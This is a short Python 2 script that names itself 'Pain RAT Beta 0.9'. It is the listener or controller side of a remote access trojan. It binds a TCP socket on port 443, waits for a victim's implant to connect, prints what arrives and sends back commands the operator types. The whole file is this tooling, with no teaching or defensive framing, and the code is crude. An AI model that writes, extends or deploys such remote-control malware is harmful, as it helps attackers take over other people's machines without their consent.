import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IP = "0.0.0.0"
PORT = 443

def listen(s):
    try:
        s.bind((IP, PORT))
        s.listen(5)
        print "Listening in: " + IP + ":" + str(PORT)
        (client_socket, address) = s.accept()
        while True:
            r = client_socket.recv(1024)
            print r
            msg = raw_input() + "\n"
            client_socket.send(msg)
            s.close

    except Exception as erro:
        print "Erro: " + str(erro)
        s.close()

def main():
    print '+----------+'
    print '| Pain RAT |'
    print '| Beta 0.9 |'
    print '+----------+'

    print '+------------+'
    print '| [*] Listen |'
    print '| [1] ON     |'
    print '| [2] OFF    |'
    print '+------------+'

    MODE = raw_input('Select Mode: ')
    if MODE == '1':
        listen(s)
    else:
        print 'Exiting...'
        sys.exit(0)

main()